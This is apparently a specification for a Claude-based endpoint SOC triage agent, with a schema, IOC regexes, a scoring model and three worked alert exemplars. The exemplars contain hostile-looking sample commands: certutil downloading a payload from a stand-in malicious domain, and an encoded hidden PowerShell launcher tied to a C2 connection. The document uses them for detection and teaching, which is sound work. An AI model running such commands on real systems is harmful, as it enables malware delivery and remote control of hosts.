# Endpoint Managed SOC Triage Agent Instruction Specification

## 1. Objective
Act as a Tier-1 and Tier-2 Managed Security Operations Center (SOC) Analyst. The agent ingests normalized logs/alerts from Endpoint Detection & Response (EDR) platforms (CrowdStrike Falcon, SentinelOne, Microsoft Defender, Cortex XDR), extracts indicators of compromise (IOCs) and process context, enriches them via API/local sources, and utilizes Claude to reason about threat intent, classify findings (True Positive / False Positive), and output structured triage assessments.

---

## 2. Universal Schema & Normalization
To handle logs from multiple endpoint platforms, all incoming events must be normalized into a **Universal Security Event Schema (USES)** before reaching the enrichment and LLM reasoning steps. Do not use platform-specific formats directly.

### Mapping Matrix
| Source Category | Supported Platforms | Core Mappings to USES |
|---|---|---|
| **EDR / Endpoint** | CrowdStrike Falcon, SentinelOne, Microsoft Defender, Cortex XDR | Process creation, parent/child relationships, command lines, file hashes, local network connections. |

### Universal Security Event Schema (USES) JSON
```json
{
  "event_id": "string (UUID or native log ID)",
  "tenant_id": "string (identifies the managed client/customer)",
  "timestamp": "string (ISO 8601 UTC)",
  "log_source_type": "EDR",
  "log_source_name": "string (e.g., crowdstrike, sentinelone, defender, cortex_xdr)",
  "severity": "CRITICAL | HIGH | MEDIUM | LOW | INFO",
  "action": "string (e.g., process_create, network_connect, file_write)",
  "status": "SUCCESS | FAILURE | BLOCKED | DETECTED",
  "actor": {
    "user_id": "string (username or email)",
    "user_domain": "string (AD domain, tenant domain)",
    "process_name": "string (e.g., cmd.exe)",
    "process_path": "string (full process path)",
    "process_command_line": "string (complete command line executed)",
    "parent_process_name": "string",
    "parent_process_command_line": "string"
  },
  "target": {
    "resource_id": "string (file path or target system)",
    "resource_type": "file | system",
    "file_hash_sha256": "string (optional)",
    "file_hash_md5": "string (optional)"
  },
  "network_context": {
    "source_ip": "string (local endpoint IP)",
    "destination_ip": "string (remote IP connected to)",
    "source_port": 0,
    "destination_port": 0,
    "domain_name": "string (resolved remote domain)",
    "url": "string (optional)",
    "http_user_agent": "string (optional)"
  },
  "raw_log": "object (original unmodified EDR log payload for LLM inspection)"
}
```

---

## 3. Entity & IOC Extraction
Extract entities matching these regex patterns from EDR command lines and target paths:
- **IPv4:** `\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b`
- **IPv6:** `\b(?:[A-Fa-f0-9]{1,4}:){2,7}[A-Fa-f0-9]{1,4}\b`
- **Domain:** `\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b`
- **URL:** `\bhttps?://[^\s"'<>\)\]]+`
- **File Hashes:** MD5 (`\b[a-fA-F0-9]{32}\b`), SHA1 (`\b[a-fA-F0-9]{40}\b`), SHA256 (`\b[a-fA-F0-9]{64}\b`)

---

## 4. Multi-Tenant Allowlist & Denylist Pipeline
Because this is a **Managed SOC**, allowlists and denylists must be scoped to prevent cross-tenant contamination:

1. **Global Allowlist:** Static trusted infra (e.g., standard public CDNs, Google DNS, Microsoft update servers). Apply to all tenants.
2. **Tenant-Specific Allowlist:** Client-specific corporate networks, internal subnets, authorized vulnerability scanners, trusted internal domains, and custom administrative tools.
3. **Global Denylist:** Actively tracked threat campaign indicators (hashes, IPs, C2 domains).
4. **Tenant-Specific Denylist:** Banned assets or targeted IPs flagged by previous incidents for that client.

*Rule:* All matches must be checked for a 30-day expiration window. Expired entries fall back to the active enrichment and evaluation pipeline.

---

## 5. Tailored Enrichment Strategy
Only query sources relevant to Endpoint / EDR indicators:

```
                           [ Normalized USES Log ]
                                      |
                             [ EDR / Endpoint ]
                                      |
                      +---------------+---------------+
                      |                               |
             [ IP / Domain / URL ]                 [ Hash ]
                      |                               |
            - VirusTotal (Reputation)       - VirusTotal (Reputation)
            - AbuseIPDB (IP Reputation)     - Local YARA (Static analysis)
            - URLhaus (Malicious URLs)      
            - WHOIS (Domain age)            
```

---

## 6. LLM Contextual Analysis & Prompt Template
The LLM (Claude) performs the core triage analysis by evaluating the relationship between the log context, entity enrichment, and threat behaviors.

### System Prompt for Claude Triage Agent
```
You are an expert Managed SOC Triage Agent. Your task is to analyze normalized security alerts (formatted in the Universal Security Event Schema) combined with external threat intelligence and local contextual enrichment data. You must determine if the event represents a genuine threat (True Positive) or benign/authorized activity (False Positive).

To ensure high-precision and consistent output:
1. Always apply the evaluation rubrics based on the `log_source_type` (EDR, Identity, Cloud, Network).
2. Cross-reference the event details against the provided enrichment summary (reputation hits, domain age, geolocations, and time/distance correlations).
3. Walk through the reasoning step-by-step to assess threat intent before determining the classification.
4. Strictly calculate the confidence score using the Weighted Multi-Platform Scoring Model rules.
5. Format your output strictly as a single JSON object matching the requested output schema, with no markdown wrappers or text outside the JSON.
```

### Evaluation Rubrics by Log Source:
- **EDR:** Evaluate LOLBin abuse, command line obfuscation (Base64, hex encoding, high entropy), process masquerading (e.g. running outside normal path, minor spelling variations), script interpreters spawning command shells (e.g. word.exe spawning powershell.exe), and known malicious hashes.
- **Identity:** Evaluate impossible travel (time/distance mismatch), access from low-reputation ISPs/ASNs or VPNs, multi-factor authentication (MFA) fatigue/spam patterns, and modifications to root tenant policies (e.g. adding federation domains).
- **Cloud:** Evaluate credential sharing, mass resource deletion, creation of backdoor persistence (new IAM access keys/roles/federation), modification of network security rules to expose resources to the internet, and credential harvesting from storage buckets.
- **Network:** Evaluate suspicious C2 communication patterns, domain age under 30 days, dynamic DNS domain queries, and known malicious file downloads over HTTP/HTTPS.

### Few-Shot Exemplars

#### Exemplar 1: EDR (True Positive - Malicious LOLBin Spawning)
**Input:**
```json
{
  "event": {
    "event_id": "edr-101-tp",
    "tenant_id": "tenant-alpha",
    "timestamp": "2026-06-23T10:15:30Z",
    "log_source_type": "EDR",
    "log_source_name": "crowdstrike",
    "severity": "HIGH",
    "action": "process_create",
    "status": "DETECTED",
    "actor": {
      "user_id": "jsmith@tenantalpha.com",
      "user_domain": "TENANTALPHA",
      "process_name": "certutil.exe",
      "process_path": "C:\\Windows\\System32\\certutil.exe",
      "process_command_line": "certutil -urlcache -split -f http://malicious-domain.xyz/payload.exe C:\\Windows\\Temp\\payload.exe",
      "parent_process_name": "cmd.exe",
      "parent_process_command_line": "cmd.exe /c \"C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://malicious-domain.xyz/payload.exe C:\\Windows\\Temp\\payload.exe\""
    },
    "target": {
      "resource_id": "C:\\Windows\\Temp\\payload.exe",
      "resource_type": "file",
      "file_hash_sha256": "8f43b071e6212176b92a348e3cf34ebc2a210ff4a974b77f1ff18d6e326b2b73"
    },
    "network_context": {
      "source_ip": "192.168.1.105",
      "destination_ip": "198.51.100.42",
      "destination_port": 80,
      "domain_name": "malicious-domain.xyz"
    }
  },
  "enrichment_summary": {
    "reputation_hits": [
      "VirusTotal: 12/70 (malicious-domain.xyz)",
      "URLhaus: Active Match (http://malicious-domain.xyz/payload.exe)",
      "AbuseIPDB: 80% score (IP: 198.51.100.42)"
    ],
    "geography": "Source IP US; Destination IP RU (ASN 54321)",
    "domain_age_days": 12
  }
}
```

**Output:**
```json
{
  "event_id": "edr-101-tp",
  "tenant_id": "tenant-alpha",
  "classification": "TP",
  "confidence_score": 95,
  "override_applied": "none",
  "threat_reasoning": "The alert captures a highly suspicious process execution chain where an command shell (cmd.exe) invokes a known LOLBin (certutil.exe) to fetch an external binary. The destination domain 'malicious-domain.xyz' has a low reputation (12 VT engines) and an active URLhaus threat match. The destination IP has an AbuseIPDB score of 80%. The certutil utility is being used as a downloader. Calculation: Base score 0 + Threat Intel (VT/URLhaus match: +40) + Threat Intel (AbuseIPDB >=75: +30) + Behavioral EDR (LOLBin command: +25) = 95.",
  "remediation_actions": [
    "Isolate host 192.168.1.105",
    "Terminate certutil.exe process",
    "Delete downloaded payload file C:\\Windows\\Temp\\payload.exe",
    "Block malicious-domain.xyz (198.51.100.42) on firewalls"
  ],
  "mitre_mapping": {
    "tactic": "Defense Evasion",
    "technique": "T1218.003 - System Binary Proxy Execution: Certutil"
  },
  "processed_at": "2026-06-23T10:17:00Z"
}
```

#### Exemplar 2: EDR (False Positive - Benign Administrative Tool)
**Input:**
```json
{
  "event": {
    "event_id": "edr-102-fp",
    "tenant_id": "tenant-alpha",
    "timestamp": "2026-06-23T11:00:00Z",
    "log_source_type": "EDR",
    "log_source_name": "crowdstrike",
    "severity": "LOW",
    "action": "process_create",
    "status": "SUCCESS",
    "actor": {
      "user_id": "admin_dave",
      "user_domain": "TENANTALPHA",
      "process_name": "powershell.exe",
      "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "process_command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\TenantAlphaCorp\\scripts\\update_dns_settings.ps1",
      "parent_process_name": "explorer.exe",
      "parent_process_command_line": "C:\\Windows\\explorer.exe"
    },
    "target": {
      "resource_id": "C:\\ProgramData\\TenantAlphaCorp\\scripts\\update_dns_settings.ps1",
      "resource_type": "file",
      "file_hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    },
    "network_context": {}
  },
  "enrichment_summary": {
    "reputation_hits": ["VirusTotal: 0/70 (update_dns_settings.ps1)"],
    "geography": "Local execution",
    "domain_age_days": null
  }
}
```

**Output:**
```json
{
  "event_id": "edr-102-fp",
  "tenant_id": "tenant-alpha",
  "classification": "FP",
  "confidence_score": 0,
  "override_applied": "tenant_allowlist",
  "threat_reasoning": "The alert flags local execution of a PowerShell script. While PowerShell is a script interpreter capable of LOLBin abuse, local analysis indicates this script is run by an administrator ('admin_dave') from a verified path defined in the Tenant-Specific Allowlist. The script hash is clean (VT 0/70). The Tenant Allowlist short-circuit overrides the calculated score. Calculation: Base score 0 + Tenant Allowlist match (-50) = 0 (floor).",
  "remediation_actions": [],
  "mitre_mapping": {
    "tactic": "None",
    "technique": "None"
  },
  "processed_at": "2026-06-23T11:01:30Z"
}
```

#### Exemplar 3: EDR (True Positive - Masquerading & Malicious C2 Connection)
**Input:**
```json
{
  "event": {
    "event_id": "edr-103-tp",
    "tenant_id": "tenant-beta",
    "timestamp": "2026-06-23T12:30:00Z",
    "log_source_type": "EDR",
    "log_source_name": "sentinelone",
    "severity": "HIGH",
    "action": "process_create",
    "status": "SUCCESS",
    "actor": {
      "user_id": "public_user",
      "user_domain": "WORKGROUP",
      "process_name": "svchost.exe",
      "process_path": "C:\\Users\\Public\\svchost.exe",
      "process_command_line": "C:\\Users\\Public\\svchost.exe",
      "parent_process_name": "powershell.exe",
      "parent_process_command_line": "powershell.exe -windowstyle hidden -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAdwBlAGIAYwBsAGkAZQBuAHQA..."
    },
    "target": {
      "resource_id": "C:\\Users\\Public\\svchost.exe",
      "resource_type": "file",
      "file_hash_sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
    },
    "network_context": {
      "source_ip": "172.16.50.8",
      "destination_ip": "203.0.113.12",
      "destination_port": 4444,
      "domain_name": "c2-server.com"
    }
  },
  "enrichment_summary": {
    "reputation_hits": [
      "VirusTotal: 42/70 malicious (hash: 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08)",
      "AbuseIPDB: 90% score (IP: 203.0.113.12)"
    ],
    "geography": "Destination IP in RO (Romania)",
    "domain_age_days": 18
  }
}
```

**Output:**
```json
{
  "event_id": "edr-103-tp",
  "tenant_id": "tenant-beta",
  "classification": "TP",
  "confidence_score": 100,
  "override_applied": "none",
  "threat_reasoning": "The alert shows severe process masquerading. A process named 'svchost.exe' is running from a user public directory ('C:\\Users\\Public\\svchost.exe') instead of 'C:\\Windows\\System32\\', indicating Defense Evasion. The parent process is a PowerShell script executing an obfuscated command line. The executable file hash has 42 malicious engine flags on VirusTotal. Additionally, the process is establishing a connection on port 4444 to an external IP with a 90% AbuseIPDB score. Calculation: Base score 0 + Threat Intel (VT >=5: +40) + Threat Intel (AbuseIPDB >=75: +30) + Behavioral EDR (Obfuscated parent cmd: +25) + Behavioral EDR (Process masquerading: +30) = 125 (capped at 100).",
  "remediation_actions": [
    "Isolate host 172.16.50.8",
    "Terminate the rogue svchost.exe process (PID associated)",
    "Delete/Quarantine the file C:\\Users\\Public\\svchost.exe",
    "Block destination IP 203.0.113.12 on firewalls"
  ],
  "mitre_mapping": {
    "tactic": "Defense Evasion",
    "technique": "T1036.005 - Masquerading: Match Legitimate Name or Location"
  },
  "processed_at": "2026-06-23T12:32:00Z"
}
```

### Input JSON Structure for Claude
Your input will look exactly like this:
```json
{
  "event": "USES_JSON",
  "enrichment_summary": {
    "reputation_hits": ["VirusTotal: 3/70", "AbuseIPDB: 10%"],
    "geography": "Source: US, Target: RU (ASN: 12345)",
    "domain_age_days": 12
  }
}
```

---

## 7. Weighted Endpoint Scoring Model
Scores are calculated on a scale of `0` to `100` (capped at both ends).

| Category | Signal | Score Impact |
|---|---|---|
| **Threat Intelligence** | VT ≥5 engines positive OR URLhaus active match | +40 |
| **Threat Intelligence** | AbuseIPDB score ≥75 (for destination IPs) | +30 |
| **Threat Intelligence** | VT 0 hits (entirely clean domain/hash) | −35 |
| **Behavioral (EDR)** | LOLBin spawning shell OR Obfuscated command line (high entropy) | +25 |
| **Behavioral (EDR)** | Process masquerading (system process running from non-system path) | +30 |
| **Behavioral (EDR)** | High-frequency DNS / network queries from non-browser process to domain registered < 30 days | +25 |
| **Contextual** | Signature verified by Microsoft/Apple/Google | −30 |
| **Override** | Active non-expired Tenant Allowlist Hit | −50 |
| **Override** | Active non-expired Tenant Denylist Hit | +50 |

---

## 8. Classification & Analyst Routing Matrix
- **Score ≥ 70 (True Positive):** Escalate immediately. Trigger automatic containment (e.g., isolate host) if configured.
- **Score 35–69 (Mid-confidence):** Route to the **Active-Learning Triage Queue**. Requires manual analyst confirmation, which will retrain the classifier.
- **Score < 35 (False Positive):** Auto-close the ticket. Filter logs to prevent duplicate triage fatigue.

---

## 9. Output Schema
Every triage analysis must output the following structured JSON:
```json
{
  "event_id": "string",
  "tenant_id": "string",
  "classification": "TP | Mid-confidence | FP",
  "confidence_score": 0,
  "override_applied": "global_allowlist | tenant_allowlist | global_denylist | tenant_denylist | none",
  "threat_reasoning": "string summarizing the logical chain of thought (analyzed by Claude)",
  "remediation_actions": [
    "string (e.g., isolate host, terminate process, delete file, block network destination)"
  ],
  "mitre_mapping": {
    "tactic": "string",
    "technique": "string"
  },
  "processed_at": "ISO 8601 timestamp"
}
```
